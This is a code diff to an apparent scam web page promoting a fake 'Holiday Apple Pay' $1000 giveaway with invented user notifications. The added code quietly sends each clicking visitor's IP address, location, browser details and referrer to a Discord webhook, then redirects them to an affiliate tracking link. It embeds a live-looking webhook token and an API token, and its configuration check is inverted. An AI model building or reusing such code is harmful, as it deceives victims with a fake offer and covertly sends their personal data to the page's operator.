@@ -734,6 +734,12 @@
     </div>
 
     <script>
+      // ============================================
+      // DISCORD WEBHOOK CONFIGURATION
+      // ============================================
+      // Replace with your Discord webhook URL
+      const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
       // Names for notifications
       const NAMES = [
         "Sarah M.", "Michael T.", "Jessica R.", "David W.", "Emma K.",
@@ -753,6 +759,95 @@
       };
 
       let currentCurrency = "$";
+      let userGeoData = null;
+
+      // ============================================
+      // DISCORD WEBHOOK FUNCTION
+      // ============================================
+      async function sendToDiscordWebhook(eventType, data) {
+        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'https://discord.com/api/webhooks/1452720419403727023/TlMSb0YLINvm8Hz6DU_EZ178s91-Tc15vqGyf_tLFEa0mnWXCLkjfO93aiZeIvTwPb0e') {
+          console.log('Discord webhook not configured');
+          return;
+        }
+
+        try {
+          const timestamp = new Date().toISOString();
+          const embed = {
+            title: "🎄 Holiday Apple Pay - Button Click",
+            color: 0x000000, // Black color
+            fields: [
+              {
+                name: "Event Type",
+                value: eventType,
+                inline: true
+              },
+              {
+                name: "Amount",
+                value: data.amount || "N/A",
+                inline: true
+              },
+              {
+                name: "Currency",
+                value: data.currency || "N/A",
+                inline: true
+              },
+              {
+                name: "Country",
+                value: data.country || "Unknown",
+                inline: true
+              },
+              {
+                name: "Region",
+                value: data.region || "Unknown",
+                inline: true
+              },
+              {
+                name: "City",
+                value: data.city || "Unknown",
+                inline: true
+              },
+              {
+                name: "IP Address",
+                value: data.ip || "Unknown",
+                inline: true
+              },
+              {
+                name: "User Agent",
+                value: data.userAgent ? data.userAgent.substring(0, 100) : "Unknown",
+                inline: false
+              },
+              {
+                name: "Page URL",
+                value: data.pageUrl || window.location.href,
+                inline: false
+              },
+              {
+                name: "Referrer",
+                value: data.referrer || document.referrer || "Direct",
+                inline: false
+              }
+            ],
+            footer: {
+              text: "Apple Pay Tracker"
+            },
+            timestamp: timestamp
+          };
+
+          await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              embeds: [embed]
+            })
+          });
+
+          console.log('Webhook sent successfully');
+        } catch (error) {
+          console.error('Error sending webhook:', error);
+        }
+      }
 
       // Update currency
       function updateCurrency(countryCode) {
@@ -772,6 +867,7 @@
         fetch("https://ipinfo.io/json?token=f1fb8d3a1d0b74")
           .then(res => res.json())
           .then(data => {
+            userGeoData = data;
             if (data.country) {
               updateCurrency(data.country);
             }
@@ -930,8 +1026,28 @@
         }, 8000);
       }
 
-      // Button click
+      // ============================================
+      // BUTTON CLICK HANDLER WITH WEBHOOK
+      // ============================================
       document.getElementById('claimButton').addEventListener('click', function() {
+        // Collect tracking data
+        const trackingData = {
+          amount: currentCurrency + "1000",
+          currency: currentCurrency,
+          country: userGeoData?.country || "Unknown",
+          region: userGeoData?.region || "Unknown",
+          city: userGeoData?.city || "Unknown",
+          ip: userGeoData?.ip || "Unknown",
+          userAgent: navigator.userAgent,
+          pageUrl: window.location.href,
+          referrer: document.referrer || "Direct",
+          timestamp: new Date().toISOString()
+        };
+
+        // Send to Discord webhook
+        sendToDiscordWebhook("Claim Button Clicked", trackingData);
+
+        // Open the target URL
         window.open('https://www.ch6rrl8trk.com/3KFRZ6/27P3D6/?sub1=d2212pm', '_blank', 'noreferrer');
       });
 
